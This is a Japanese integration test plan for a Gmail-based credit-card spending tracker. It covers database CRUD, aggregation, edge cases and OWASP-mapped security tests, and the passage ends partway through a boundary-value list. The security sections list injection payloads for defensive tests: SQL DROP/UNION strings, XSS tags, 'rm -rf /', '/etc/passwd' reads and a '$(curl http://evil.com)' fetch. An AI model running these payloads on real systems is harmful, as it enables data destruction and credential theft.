# 統合テスト計画書 Part 2：データ層・エッジケース・セキュリティ

**プロジェクト**: card-spending-tracker
**バージョン**: 1.0.0（統合版）
**作成日**: 2026-02-16
**統合担当**: 足軽7号
**統合元計画**:
- データ層テスト計画書（足軽3号作成、67ケース）
- エッジケース・セキュリティテスト計画書（足軽4号作成、55ケース）

---

## 目次

1. [統合テスト概要](#1-統合テスト概要)
2. [データ層テストケース（67件）](#2-データ層テストケース67件)
   - 2.1 [CRUD操作](#21-crud操作)
   - 2.2 [データ整合性](#22-データ整合性)
   - 2.3 [集計機能](#23-集計機能)
   - 2.4 [トランザクション処理](#24-トランザクション処理)
   - 2.5 [インデックス・パフォーマンス](#25-インデックスパフォーマンス)
3. [エッジケーステストケース（30件）](#3-エッジケーステストケース30件)
4. [セキュリティテストケース（25件）](#4-セキュリティテストケース25件)
5. [テストデータ準備方針（統合版）](#5-テストデータ準備方針統合版)
6. [付録](#6-付録)

---

## 1. 統合テスト概要

### 1.1 テスト範囲

本計画書は以下3領域の統合版を提供:

| 領域 | テスト件数 | テストIDプレフィックス | 担当専門性 |
|------|----------|-------------------|---------|
| **データ層** | 67件 | T-DATA-001〜067 | CRUD、整合性、集計、トランザクション、インデックス |
| **エッジケース** | 30件 | T-EDGE-001〜030 | 不正フォーマット、重複処理、API異常、環境エラー |
| **セキュリティ** | 25件 | T-SEC-001〜025 | フィッシング対策、インジェクション攻撃、認証、暗号化 |
| **合計** | **122件** | - | - |

### 1.2 テスト階層

| 階層 | 説明 | 担当 | 該当テストID範囲 |
|------|------|------|---------------|
| **Unit** | 単一関数・モジュールの入出力検証 | 足軽 | T-DATA-001〜041, T-DATA-062〜067, T-EDGE-001〜016, T-SEC-005〜010 |
| **Integration** | コンポーネント間連携、異常系処理 | 足軽 | T-DATA-042〜061, T-EDGE-017〜030, T-SEC-001〜004, T-SEC-011〜025 |
| **E2E** | システム全体統合テスト | 家老 | 本計画書の対象外 |

### 1.3 前提条件

| 項目 | 要件 |
|------|------|
| **Python** | 3.11以上 |
| **SQLite** | 3.35.0以上（JSON関数、ウィンドウ関数サポート） |
| **テストフレームワーク** | pytest 8.0以上 |
| **カバレッジ測定** | pytest-cov 4.1以上 |
| **依存ライブラリ** | SQLAlchemy 2.0以上 |
| **テストデータ** | Fixture-based（`tests/conftest.py`, `tests/fixtures/`） |

### 1.4 カバレッジ目標

| モジュール | 目標カバレッジ |
|-----------|-------------|
| `app/models/transaction.py` | 95%以上 |
| `app/database/connection.py` | 90%以上 |
| `app/services/sync_service.py` | 85%以上 |
| `app/services/summary_service.py` | 90%以上 |

### 1.5 重要な方針

- **SKIP = FAIL扱い**: テスト報告でSKIP数が1以上なら「テスト未完了」
- **前提条件チェック**: テスト実行前に環境・依存ツールを確認、満たせないなら実行せず報告
- **並列実行対応**: インメモリDBを使用（各テスト関数ごとに新規DB作成）

---

## 2. データ層テストケース（67件）

### 2.1 CRUD操作

#### 2.1.1 Create（INSERT）操作

| テストID | テスト対象 | テスト内容 | 期待結果 | 優先度 | テスト階層 |
|---------|----------|----------|---------|-------|---------|
| **T-DATA-001** | INSERT基本操作 | 全カラムに有効なデータを挿入 | レコードが正常に挿入され、idが自動採番される | Critical | Unit |
| **T-DATA-002** | INSERT（merchantがNULL） | merchant列をNULLで挿入 | レコードが正常に挿入される（NULL許容列） | High | Unit |
| **T-DATA-003** | INSERT（gmail_message_id重複） | 既存のgmail_message_idと同じ値を挿入 | IntegrityError発生、ロールバックされる | Critical | Unit |
| **T-DATA-004** | INSERT（NOT NULL制約違反） | card_companyをNULLで挿入 | IntegrityError発生、レコード挿入失敗 | Critical | Unit |
| **T-DATA-005** | INSERT（created_atのDEFAULT値） | created_atを指定せずに挿入 | 現在時刻が自動設定される | High | Unit |
| **T-DATA-006** | INSERT（is_verifiedのDEFAULT値） | is_verifiedを指定せずに挿入 | デフォルト値0（False）が設定される | High | Unit |
| **T-DATA-007** | INSERT（境界値：金額0円） | amountに0を挿入 | レコードが正常に挿入される | High | Unit |
| **T-DATA-008** | INSERT（境界値：金額負数） | amountに-1000を挿入 | レコードが挿入される（アプリ層でバリデーション推奨） | Medium | Unit |
| **T-DATA-009** | INSERT（境界値：金額巨額） | amountに999999999（10億円未満）を挿入 | レコードが正常に挿入される | Medium | Unit |
| **T-DATA-010** | INSERT（特殊文字を含む店舗名） | merchantに「`<script>alert('XSS')</script>`」を挿入 | レコードが正常に挿入される（SQLインジェクション対策検証） | High | Unit |
| **T-DATA-011** | INSERT（日本語店舗名） | merchantに「イオンモール幕張新都心店」を挿入 | レコードが正常に挿入される | Medium | Unit |
| **T-DATA-012** | INSERT（日時形式ISO 8601） | transaction_dateに`'2026-02-15 14:30:00'`を挿入 | レコードが正常に挿入される | High | Unit |

#### 2.1.2 Read（SELECT）操作

| テストID | テスト対象 | テスト内容 | 期待結果 | 優先度 | テスト階層 |
|---------|----------|----------|---------|-------|---------|
| **T-DATA-013** | SELECT全件取得 | テーブル全体を取得 | 挿入済み全レコードが返却される | High | Unit |
| **T-DATA-014** | SELECT（WHERE card_company） | card_company='三井住友'で絞り込み | 該当レコードのみ返却される | High | Unit |
| **T-DATA-015** | SELECT（WHERE is_verified=1） | 信頼できるメールのみ取得 | is_verified=1のレコードのみ返却される | High | Unit |
| **T-DATA-016** | SELECT（ORDER BY transaction_date DESC） | 取引日時の降順でソート | 最新の取引が最初に返却される | Medium | Unit |
| **T-DATA-017** | SELECT（LIKE検索：merchant） | merchantに'Amazon'を含むレコード検索 | 部分一致でヒットする | Medium | Unit |
| **T-DATA-018** | SELECT（日付範囲指定） | transaction_dateが2026-02-01〜2026-02-28の範囲 | 該当期間のレコードのみ返却される | High | Unit |
| **T-DATA-019** | SELECT（gmail_message_idでユニーク検索） | 特定のgmail_message_idで検索 | 0件または1件のみ返却される（UNIQUE制約） | High | Unit |
| **T-DATA-020** | SELECT（JOINなし、インデックス使用確認） | EXPLAIN QUERY PLANでインデックス使用を確認 | idx_card_company, idx_transaction_dateが使用される | Medium | Unit |

#### 2.1.3 Update（UPDATE）操作

| テストID | テスト対象 | テスト内容 | 期待結果 | 優先度 | テスト階層 |
|---------|----------|----------|---------|-------|---------|
| **T-DATA-021** | UPDATE基本操作 | is_verifiedを0から1に更新 | 対象レコードが更新される | High | Unit |
| **T-DATA-022** | UPDATE（merchant修正） | merchantを'Amazon'から'Amazon.co.jp'に修正 | レコードが更新される | Medium | Unit |
| **T-DATA-023** | UPDATE（gmail_message_id変更→重複） | 既存のgmail_message_idに変更 | IntegrityError発生、ロールバック | Critical | Unit |
| **T-DATA-024** | UPDATE（WHERE条件なし） | WHERE句なしで全レコードのis_verifiedを1に更新 | 全レコードが更新される | Medium | Unit |
| **T-DATA-025** | UPDATE（存在しないIDを指定） | id=999999で更新 | 0件更新（エラーなし） | Low | Unit |

#### 2.1.4 Delete（DELETE）操作

| テストID | テスト対象 | テスト内容 | 期待結果 | 優先度 | テスト階層 |
|---------|----------|----------|---------|-------|---------|
| **T-DATA-026** | DELETE基本操作 | 特定のidでレコード削除 | 対象レコードが削除される | High | Unit |
| **T-DATA-027** | DELETE（WHERE条件複数） | card_company='楽天' AND is_verified=0で削除 | 該当レコードのみ削除される | Medium | Unit |
| **T-DATA-028** | DELETE（全件削除） | WHERE句なしで全削除 | 全レコードが削除される | Low | Unit |
| **T-DATA-029** | DELETE（存在しないIDを指定） | id=999999で削除 | 0件削除（エラーなし） | Low | Unit |

### 2.2 データ整合性

| テストID | テスト対象 | テスト内容 | 期待結果 | 優先度 | テスト階層 |
|---------|----------|----------|---------|-------|---------|
| **T-DATA-030** | UNIQUE制約（gmail_message_id） | 同じgmail_message_idを2回挿入 | 2回目でIntegrityError発生 | Critical | Unit |
| **T-DATA-031** | NOT NULL制約（card_company） | card_companyをNULLで挿入 | IntegrityError発生 | Critical | Unit |
| **T-DATA-032** | NOT NULL制約（amount） | amountをNULLで挿入 | IntegrityError発生 | Critical | Unit |
| **T-DATA-033** | NOT NULL制約（transaction_date） | transaction_dateをNULLで挿入 | IntegrityError発生 | Critical | Unit |
| **T-DATA-034** | NOT NULL制約（email_subject） | email_subjectをNULLで挿入 | IntegrityError発生 | Critical | Unit |
| **T-DATA-035** | NOT NULL制約（email_from） | email_fromをNULLで挿入 | IntegrityError発生 | Critical | Unit |
| **T-DATA-036** | NOT NULL制約（gmail_message_id） | gmail_message_idをNULLで挿入 | IntegrityError発生 | Critical | Unit |
| **T-DATA-037** | NULL許容（merchant） | merchantをNULLで挿入 | レコードが正常に挿入される | High | Unit |
| **T-DATA-038** | PRIMARY KEY自動採番 | idを指定せずに連続挿入 | id=1, 2, 3...と自動採番される | High | Unit |
| **T-DATA-039** | PRIMARY KEY重複挿入 | 明示的に同じidを2回挿入 | 2回目でIntegrityError発生 | High | Unit |
| **T-DATA-040** | BOOLEAN型（is_verified） | is_verifiedに0, 1, True, Falseを挿入 | 全て正常に挿入され、SQLiteで0/1として保存される | Medium | Unit |
| **T-DATA-041** | TEXT型の文字数制限なし | merchantに10,000文字の文字列を挿入 | レコードが正常に挿入される（SQLiteのTEXT制限検証） | Low | Unit |

### 2.3 集計機能

#### 2.3.1 月次集計ビュー（monthly_summary）

| テストID | テスト対象 | テスト内容 | 期待結果 | 優先度 | テスト階層 |
|---------|----------|----------|---------|-------|---------|
| **T-DATA-042** | 月次集計（基本） | 2026-02の三井住友カード利用額を集計 | SUM(amount)が正しく計算される | Critical | Integration |
| **T-DATA-043** | 月次集計（複数カード） | 2026-02の全カード会社の合計を集計 | カード会社別にグルーピングされる | Critical | Integration |
| **T-DATA-044** | 月次集計（COUNT集計） | 2026-02の取引件数をカウント | COUNT(*)が正しく返却される | High | Integration |
| **T-DATA-045** | 月次集計（AVG集計） | 2026-02の平均利用額を算出 | AVG(amount)が正しく計算される | High | Integration |
| **T-DATA-046** | 月次集計（is_verified=0除外） | is_verified=0のレコードが集計から除外されるか確認 | 信頼できるメール（is_verified=1）のみ集計される | Critical | Integration |
| **T-DATA-047** | 月次集計（ORDER BY total_amount DESC） | 金額降順でソート | 最大利用カードが最初に返却される | Medium | Integration |
| **T-DATA-048** | 月次集計（データなし） | 該当月にレコードが0件の場合 | 空の結果セットが返却される（エラーなし） | Medium | Integration |
| **T-DATA-049** | 月次集計（境界値：0円レコード含む） | amountが0円のレコードも集計対象 | SUM, AVG計算に含まれる | Medium | Integration |
| **T-DATA-050** | 月次集計（strftime関数検証） | transaction_dateから年月を抽出 | 'YYYY-MM'形式で正しくグルーピングされる | High | Integration |

#### 2.3.2 カスタム集計クエリ

| テストID | テスト対象 | テスト内容 | 期待結果 | 優先度 | テスト階層 |
|---------|----------|----------|---------|-------|---------|
| **T-DATA-051** | カード別累計（全期間） | 三井住友カードの累計利用額を集計 | SUM(amount)が正しく計算される | High | Integration |
| **T-DATA-052** | 日別集計 | 2026-02-15の日別利用額を集計 | strftime('%Y-%m-%d')でグルーピング | Medium | Integration |
| **T-DATA-053** | 店舗別集計（TOP 10） | 利用頻度の高い店舗TOP 10を抽出 | GROUP BY merchant, ORDER BY COUNT(*) DESC LIMIT 10 | Medium | Integration |
| **T-DATA-054** | 期間指定集計（3ヶ月間） | 2026-01〜2026-03の3ヶ月間集計 | WHERE transaction_date BETWEEN ... | High | Integration |
| **T-DATA-055** | 最大・最小金額取得 | MAX(amount), MIN(amount)を取得 | 正しい最大値・最小値が返却される | Medium | Integration |

### 2.4 トランザクション処理

| テストID | テスト対象 | テスト内容 | 期待結果 | 優先度 | テスト階層 |
|---------|----------|----------|---------|-------|---------|
| **T-DATA-056** | COMMIT（正常系） | INSERT → COMMIT | レコードが永続化される | Critical | Integration |
| **T-DATA-057** | ROLLBACK（異常系） | INSERT → エラー → ROLLBACK | レコードが挿入されない | Critical | Integration |
| **T-DATA-058** | IntegrityError時の自動ロールバック | gmail_message_id重複挿入 → 自動ロールバック | DB状態が変更前に戻る | Critical | Integration |
| **T-DATA-059** | 複数INSERT → 途中でエラー → 全ロールバック | 3件挿入、2件目でエラー → 全件ロールバック | 1件目、3件目も挿入されない（原子性） | High | Integration |
| **T-DATA-060** | トランザクション分離レベル（デフォルト） | SQLiteのデフォルト分離レベルを確認 | `PRAGMA read_uncommitted`で確認（デフォルト=0） | Medium | Integration |
| **T-DATA-061** | 同時書き込み（SQLite LOCK） | 2つのトランザクションが同時にINSERT | 1つはロック待ち → 順次処理される | Low | Integration |

**注**: SQLiteは個人利用前提のため、同時実行・排他制御テスト（T-DATA-061）は低優先度。

### 2.5 インデックス・パフォーマンス

| テストID | テスト対象 | テスト内容 | 期待結果 | 優先度 | テスト階層 |
|---------|----------|----------|---------|-------|---------|
| **T-DATA-062** | インデックス使用確認（transaction_date） | EXPLAIN QUERY PLAN: WHERE transaction_date BETWEEN ... | idx_transaction_dateが使用される | High | Unit |
| **T-DATA-063** | インデックス使用確認（card_company） | EXPLAIN QUERY PLAN: WHERE card_company='三井住友' | idx_card_companyが使用される | High | Unit |
| **T-DATA-064** | インデックス使用確認（is_verified） | EXPLAIN QUERY PLAN: WHERE is_verified=1 | idx_is_verifiedが使用される | High | Unit |
| **T-DATA-065** | インデックスなしクエリ（merchant） | EXPLAIN QUERY PLAN: WHERE merchant LIKE '%Amazon%' | SCAN TABLE（インデックス未使用、期待動作） | Medium | Unit |
| **T-DATA-066** | クエリ実行時間測定（1万件） | 1万件のレコードに対してSELECT実行 | 100ms以内（参考値、環境依存） | Low | Integration |
| **T-DATA-067** | インデックス再構築 | REINDEX実行後のクエリパフォーマンス | パフォーマンス劣化なし | Low | Integration |

---

## 3. エッジケーステストケース（30件）

### 3.1 概要

**専門領域**: 不正フォーマット、重複処理、API異常、環境エラー、エラーリカバリー

### 3.2 テストケース一覧

| テストID | 対象 | テストシナリオ | 期待される防御挙動 | 優先度 | テスト階層 |
|---------|------|--------------|-----------------|-------|----------|
| **T-EDGE-001** | メール解析 | HTMLタグ不完全（閉じタグなし） | パース失敗を検知、ログ記録、処理スキップ | **Critical** | Unit |
| **T-EDGE-002** | メール解析 | 文字エンコーディング異常（Shift-JIS → UTF-8誤変換） | 文字化け検知、警告ログ、部分的データ保存 | **High** | Unit |
| **T-EDGE-003** | メール解析 | UTF-8 BOM付きメール本文 | BOM除去後に正常パース | **Medium** | Unit |
| **T-EDGE-004** | メール解析 | 金額フィールド欠損（「利用金額」の記載なし） | NULLまたは0円として保存、`is_verified=0`フラグ設定 | **Critical** | Unit |
| **T-EDGE-005** | メール解析 | 日時フィールド欠損（「利用日」の記載なし） | パース失敗、該当メールをスキップ、ログ記録 | **Critical** | Unit |
| **T-EDGE-006** | メール解析 | 店舗名フィールド欠損 | `merchant=NULL`として保存（許容） | **Low** | Unit |
| **T-EDGE-007** | メール解析 | 金額に不正文字（"1,234X円"） | パース失敗、ログ記録、処理スキップ | **High** | Unit |
| **T-EDGE-008** | メール解析 | 金額が0円 | 正常データとして保存（エラーではない） | **Medium** | Unit |
| **T-EDGE-009** | メール解析 | 金額が負の値（"-1,234円"） | パース失敗またはエラーフラグ、ログ記録 | **High** | Unit |
| **T-EDGE-010** | メール解析 | 金額が極端に大きい（100億円超） | オーバーフロー防止、INT上限チェック、警告ログ | **High** | Unit |
| **T-EDGE-011** | メール解析 | 日時が未来の日付（2027年など） | 警告ログ記録、`is_verified=0`フラグ設定 | **Medium** | Unit |
| **T-EDGE-012** | メール解析 | 日時がうるう年境界値（2月29日/30日） | 正常パース（2/29は許容、2/30は拒否） | **Medium** | Unit |
| **T-EDGE-013** | メール解析 | 店舗名が異常に長い（1000文字超） | 切り捨てまたは長さ制限、警告ログ | **Low** | Unit |
| **T-EDGE-014** | メール解析 | 店舗名に特殊文字（改行、NULL文字、制御文字） | サニタイズ処理、危険文字除去 | **High** | Unit |
| **T-EDGE-015** | メール解析 | カード会社判別失敗（件名が未知パターン） | 不明カード会社として記録、`is_verified=0` | **Medium** | Unit |
| **T-EDGE-016** | メール解析 | 複数カード会社名が件名に混在 | 最初にマッチしたカード会社を採用、警告ログ | **Low** | Unit |
| **T-EDGE-017** | 重複処理 | 同一Gmail message IDを2回取得 | 2回目の挿入時にINTEGRITY ERRORでスキップ | **Critical** | Integration |
| **T-EDGE-018** | 重複処理 | 楽天カード速報版→確定版（金額異なる） | 速報版のみ保存、確定版はmessage ID重複でスキップ | **High** | Integration |
| **T-EDGE-019** | 重複処理 | 楽天カード速報版→確定版（金額同じ） | 速報版のみ保存、確定版はmessage ID重複でスキップ | **High** | Integration |
| **T-EDGE-020** | Gmail API | API レスポンスが空（`messages: []`） | 処理スキップ、ログに「新規メールなし」記録 | **Medium** | Integration |
| **T-EDGE-021** | Gmail API | ページネーション中にnextPageToken=null | ループ終了、取得済みメールのみ処理 | **Medium** | Integration |
| **T-EDGE-022** | Gmail API | メール本文取得時に404エラー（削除済み） | 該当メールをスキップ、ログ記録、次のメールへ | **Medium** | Integration |
| **T-EDGE-023** | Gmail API | 大量メール取得時のメモリ不足 | バッチ処理（100件ずつ）、メモリ使用量監視 | **High** | Integration |
| **T-EDGE-024** | DB保存 | SQLiteファイルが読み取り専用 | エラー検知、ユーザーに権限変更を促すエラーメッセージ | **High** | Integration |
| **T-EDGE-025** | DB保存 | ディスク容量不足 | 挿入失敗検知、明確なエラーメッセージ表示 | **High** | Integration |
| **T-EDGE-026** | DB保存 | トランザクション途中でクラッシュ | ロールバック保証、次回起動時に再試行 | **Medium** | Integration |
| **T-EDGE-027** | OAuth認証 | トークンファイルが破損（pickle読込失敗） | 再認証フロー開始、ユーザーにブラウザ認証を促す | **High** | Integration |
| **T-EDGE-028** | OAuth認証 | リフレッシュトークンが失効済み | RefreshError捕捉、再認証フロー開始 | **Critical** | Integration |
| **T-EDGE-029** | OAuth認証 | credentials.jsonが存在しない | 明確なエラーメッセージ、セットアップガイドへ誘導 | **High** | Integration |
| **T-EDGE-030** | 環境変数 | TOKEN_ENCRYPTION_KEYが未設定 | 暗号化失敗検知、環境変数設定を促すエラー | **High** | Integration |

---

## 4. セキュリティテストケース（25件）

### 4.1 概要

**専門領域**: フィッシング対策、インジェクション攻撃、認証情報漏洩防止、OWASP Top 10対応

### 4.2 テストケース一覧

| テストID | 対象 | 攻撃シナリオ | 期待される防御挙動 | 優先度 | OWASP分類 |
|---------|------|------------|-----------------|-------|-----------|
| **T-SEC-001** | フィッシング対策 | 送信元が不正ドメイン（`@fake-vpass.ne.jp`） | ドメイン検証失敗、`is_verified=0`、警告ログ | **Critical** | A07:2021 認証の失敗 |
| **T-SEC-002** | フィッシング対策 | セゾンカードからのメール（セゾンはメール送信しない） | 自動的にフィッシング判定、データ保存しない、警告ログ | **Critical** | A07:2021 認証の失敗 |
| **T-SEC-003** | フィッシング対策 | 件名は正規、ドメインが不正（三井住友を騙る） | ドメインホワイトリストで検証、`is_verified=0` | **Critical** | A07:2021 認証の失敗 |
| **T-SEC-004** | フィッシング対策 | 送信元アドレスのDisplay Name偽装 | Fromヘッダーのドメイン部のみ検証（Display Name無視） | **High** | A07:2021 認証の失敗 |
| **T-SEC-005** | SQLインジェクション | 店舗名に`'; DROP TABLE card_transactions;--`を含む | プレースホルダー使用、エスケープ処理、実行阻止 | **Critical** | A03:2021 インジェクション |
| **T-SEC-006** | SQLインジェクション | 店舗名に`' OR '1'='1`を含む | プレースホルダー使用、SQLとして実行されない | **Critical** | A03:2021 インジェクション |
| **T-SEC-007** | XSS（格納型） | 店舗名に`<script>alert('XSS')</script>`を含む | HTML出力時にエスケープ、スクリプト実行阻止 | **Critical** | A03:2021 インジェクション |
| **T-SEC-008** | XSS（格納型） | 店舗名に`<img src=x onerror=alert(1)>`を含む | HTML出力時にエスケープ、スクリプト実行阻止 | **Critical** | A03:2021 インジェクション |
| **T-SEC-009** | コマンドインジェクション | 店舗名に`; rm -rf /`を含む | コマンド実行機能なし（該当処理なし）、念のためログ監視 | **High** | A03:2021 インジェクション |
| **T-SEC-010** | パストラバーサル | Gmail message IDに`../../../etc/passwd`を含む | ファイル名サニタイズ、危険文字除去 | **High** | A01:2021 アクセス制御の不備 |
| **T-SEC-011** | 認証情報漏洩 | token.pickleファイルが平文で保存 | Fernet暗号化されている、平文保存されていない | **Critical** | A02:2021 暗号化の失敗 |
| **T-SEC-012** | 認証情報漏洩 | ログにOAuthトークンが出力 | トークンをログに出力しない、マスク処理 | **Critical** | A09:2021 セキュリティログの失敗 |
| **T-SEC-013** | 認証情報漏洩 | credentials.jsonが.gitignore対象外 | .gitignoreに含まれる、Gitにコミットされない | **Critical** | A05:2021 セキュリティ設定ミス |
| **T-SEC-014** | API レート制限 | 429エラー（Rate Limit Exceeded） | Exponential Backoff実装、2秒→4秒→8秒待機 | **High** | A04:2021 安全でない設計 |
| **T-SEC-015** | API レート制限 | 連続100回のAPI呼び出し | レート制限に到達しない、またはBackoffで回復 | **High** | A04:2021 安全でない設計 |
| **T-SEC-016** | 認証エラー | 401エラー（Unauthorized、トークン期限切れ） | 自動リフレッシュ実行、失敗時は再認証フロー | **Critical** | A07:2021 認証の失敗 |
| **T-SEC-017** | 認証エラー | 403エラー（Forbidden、スコープ不足） | エラーメッセージ表示、スコープ追加方法を案内 | **High** | A07:2021 認証の失敗 |
| **T-SEC-018** | CSRF | FastAPI `/api/sync`エンドポイントへの不正リクエスト | CSRF トークン検証（またはSameSite Cookie） | **High** | A01:2021 アクセス制御の不備 |
| **T-SEC-019** | DoS攻撃 | 極端に大きいHTML（10MB超のメール本文） | サイズ上限チェック、パース前にサイズ検証 | **Medium** | A04:2021 安全でない設計 |
| **T-SEC-020** | 正規表現DoS（ReDoS） | 正規表現に対する悪意のある入力（大量バックトラック） | タイムアウト設定、複雑度の低い正規表現使用 | **Medium** | A04:2021 安全でない設計 |
| **T-SEC-021** | 機密情報漏洩 | SQLiteファイルの権限が777（全ユーザー読取可能） | ファイル権限600推奨、Dockerコンテナ内で適切な権限設定 | **High** | A05:2021 セキュリティ設定ミス |
| **T-SEC-022** | 機密情報漏洩 | エラーメッセージに内部パスが含まれる | 本番環境でスタックトレース非表示、汎用エラーメッセージ | **Medium** | A09:2021 セキュリティログの失敗 |
| **T-SEC-023** | 中間者攻撃（MITM） | OAuth認証時のHTTP接続 | HTTPS強制、証明書検証 | **Critical** | A02:2021 暗号化の失敗 |
| **T-SEC-024** | トークン盗難 | token.pickleファイルが盗まれた場合 | 暗号化されているため、環境変数KEYなしでは復号不可 | **High** | A02:2021 暗号化の失敗 |
| **T-SEC-025** | 依存ライブラリ脆弱性 | google-api-python-clientに既知の脆弱性 | 定期的な依存関係更新、`poetry update`実施 | **Medium** | A06:2021 脆弱な古いコンポーネント |

### 4.3 OWASP Top 10 対応マトリックス

| OWASP分類 | 該当テストID | カバー率 |
|-----------|------------|---------|
| **A01:2021 アクセス制御の不備** | T-SEC-010, T-SEC-018 | 2件 |
| **A02:2021 暗号化の失敗** | T-SEC-011, T-SEC-023, T-SEC-024 | 3件 |
| **A03:2021 インジェクション** | T-SEC-005〜009 | 5件 |
| **A04:2021 安全でない設計** | T-SEC-014, T-SEC-015, T-SEC-019, T-SEC-020 | 4件 |
| **A05:2021 セキュリティ設定ミス** | T-SEC-013, T-SEC-021 | 2件 |
| **A06:2021 脆弱な古いコンポーネント** | T-SEC-025 | 1件 |
| **A07:2021 認証の失敗** | T-SEC-001〜004, T-SEC-016, T-SEC-017 | 6件 |
| **A09:2021 セキュリティログの失敗** | T-SEC-012, T-SEC-022 | 2件 |

**カバレッジ**: OWASP Top 10のうち8項目をカバー（未カバー: A08 ソフトウェアとデータの整合性、A10 サーバサイドリクエストフォージェリ）

---

## 5. テストデータ準備方針（統合版）

### 5.1 Fixture戦略（データ層テスト共通）

#### 5.1.1 pytest Fixture定義

```python
# tests/conftest.py

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from app.models.transaction import Base, CardTransaction
from datetime import datetime

@pytest.fixture(scope='function')
def db_session():
    """テスト用インメモリDB（各テスト関数ごとに新規作成）"""
    engine = create_engine('sqlite:///:memory:')
    Base.metadata.create_all(engine)
    Session = sessionmaker(bind=engine)
    session = Session()
    yield session
    session.close()

@pytest.fixture
def sample_transaction_data():
    """サンプル取引データ（1件）"""
    return {
        'card_company': '三井住友',
        'amount': 5000,
        'transaction_date': datetime(2026, 2, 15, 14, 30, 0),
        'merchant': 'スターバックス 渋谷店',
        'email_subject': '【三井住友カード】ご利用のお知らせ',
        'email_from': 'no-reply@contact.vpass.ne.jp',
        'gmail_message_id': 'msg_12345abcde',
        'is_verified': True,
    }

@pytest.fixture
def multiple_transactions(db_session):
    """複数の取引データを挿入（月次集計テスト用）"""
    transactions = [
        CardTransaction(
            card_company='三井住友',
            amount=3000,
            transaction_date=datetime(2026, 2, 1, 10, 0, 0),
            merchant='セブンイレブン',
            email_subject='【三井住友カード】ご利用のお知らせ',
            email_from='no-reply@contact.vpass.ne.jp',
            gmail_message_id='msg_001',
            is_verified=True,
        ),
        CardTransaction(
            card_company='楽天',
            amount=15000,
            transaction_date=datetime(2026, 2, 5, 15, 30, 0),
            merchant='Amazon.co.jp',
            email_subject='【楽天カード】カードご利用のお知らせ',
            email_from='no-reply@mail.rakuten-card.co.jp',
            gmail_message_id='msg_002',
            is_verified=True,
        ),
        CardTransaction(
            card_company='JCB',
            amount=8000,
            transaction_date=datetime(2026, 2, 10, 12, 0, 0),
            merchant='ヨドバシカメラ 新宿店',
            email_subject='【JCB】カードご利用のお知らせ',
            email_from='no-reply@qa.jcb.co.jp',
            gmail_message_id='msg_003',
            is_verified=True,
        ),
        # 不正メール（is_verified=False）
        CardTransaction(
            card_company='AMEX',
            amount=50000,
            transaction_date=datetime(2026, 2, 12, 18, 0, 0),
            merchant='不明な店舗',
            email_subject='【AMEX】カードご利用のお知らせ',
            email_from='phishing@fake-amex.com',
            gmail_message_id='msg_004',
            is_verified=False,  # 信頼できないメール
        ),
    ]
    db_session.add_all(transactions)
    db_session.commit()
    return transactions
```

### 5.2 エッジケーステストデータ

#### 5.2.1 不正フォーマットメール

```
tests/fixtures/edge_cases/
├── broken_html_unclosed_tags.eml         # T-EDGE-001
├── encoding_shiftjis_to_utf8.eml        # T-EDGE-002
├── utf8_bom.eml                         # T-EDGE-003
├── missing_amount_field.eml             # T-EDGE-004
├── missing_date_field.eml               # T-EDGE-005
├── missing_merchant_field.eml           # T-EDGE-006
├── invalid_amount_with_char.eml         # T-EDGE-007
├── zero_amount.eml                      # T-EDGE-008
├── negative_amount.eml                  # T-EDGE-009
├── huge_amount_overflow.eml             # T-EDGE-010
├── future_date.eml                      # T-EDGE-011
├── leap_year_boundary.eml               # T-EDGE-012
├── long_merchant_name.eml               # T-EDGE-013
├── merchant_with_special_chars.eml      # T-EDGE-014
├── unknown_card_company.eml             # T-EDGE-015
└── multiple_card_companies.eml          # T-EDGE-016
```

#### 5.2.2 重複テストデータ

```python
# T-EDGE-017: 同一message ID
duplicate_email = {
    "id": "msg_12345",
    "subject": "【楽天カード】カード利用のお知らせ",
    "from": "info@mail.rakuten-card.co.jp",
    "body": "利用金額: 1,234円"
}

# T-EDGE-018: 楽天速報版→確定版（金額異なる）
rakuten_preliminary = {
    "id": "msg_rakuten_001",
    "subject": "【楽天カード】カード利用のお知らせ（速報）",
    "body": "利用金額: 1,200円"  # 速報版
}
rakuten_final = {
    "id": "msg_rakuten_001",  # 同じID
    "subject": "【楽天カード】カード利用のお知らせ（確定）",
    "body": "利用金額: 1,234円"  # 確定版
}
```

### 5.3 セキュリティテストデータ

#### 5.3.1 フィッシングメールサンプル

```
tests/fixtures/security/phishing/
├── fake_domain_smbc.eml                 # T-SEC-001: @fake-vpass.ne.jp
├── saison_phishing.eml                  # T-SEC-002: セゾンカード詐欺
├── domain_mismatch.eml                  # T-SEC-003: 件名正規、ドメイン不正
└── display_name_spoofing.eml            # T-SEC-004: Display Name偽装
```

**サンプル（T-SEC-002）**:
```
From: セゾンカード <fake@saison-phishing.com>
Subject: 【セゾンカード】カードご利用のお知らせ
Date: 2026-02-15 10:00:00

利用金額: 50,000円
利用日: 2026/02/15 09:30
ご利用先店名: 不正業者

※ セゾンカードは利用通知メールを送信しない（アプリのみ）
→ このメールは100%フィッシング
```

#### 5.3.2 インジェクション攻撃パターン

```python
# T-SEC-005/006: SQLインジェクション
sql_injection_patterns = [
    "'; DROP TABLE card_transactions;--",
    "' OR '1'='1",
    "1' UNION SELECT * FROM card_transactions--",
    "'; DELETE FROM card_transactions WHERE '1'='1",
]

# T-SEC-007/008: XSS攻撃
xss_patterns = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<iframe src='javascript:alert(1)'>",
    "javascript:alert('XSS')",
    "<svg/onload=alert('XSS')>",
]

# T-SEC-009: コマンドインジェクション
command_injection_patterns = [
    "; rm -rf /",
    "| cat /etc/passwd",
    "`whoami`",
    "$(curl http://evil.com)",
]

# T-SEC-010: パストラバーサル
path_traversal_patterns = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "/etc/shadow",
]
```

#### 5.3.3 境界値テストデータ

```python
boundary_test_cases = {
    "amount": [
        0,                    # T-EDGE-008: 最小値
        2147483647,           # T-EDGE-010: INT最大値
        -1,                   # T-EDGE-009: 負の値（不正）
        999999999999,         # T-EDGE-010: オーバーフロー
    ],
    "merchant_name": [
        "A" * 1000,           # T-EDGE-013: 長い店舗名
        "店舗\x00名",         # T-EDGE-014: NULL文字
        "店舗\n名",           # T-EDGE-014: 改行
        "店舗\r\n名",         # T-EDGE-014: CRLF
    ],
    "date": [
        "2026-02-29",         # T-EDGE-012: うるう年（2026年は平年→不正）
        "2024-02-29",         # T-EDGE-012: うるう年（2024年は閏年→正常）
        "2027-12-31",         # T-EDGE-011: 未来日付
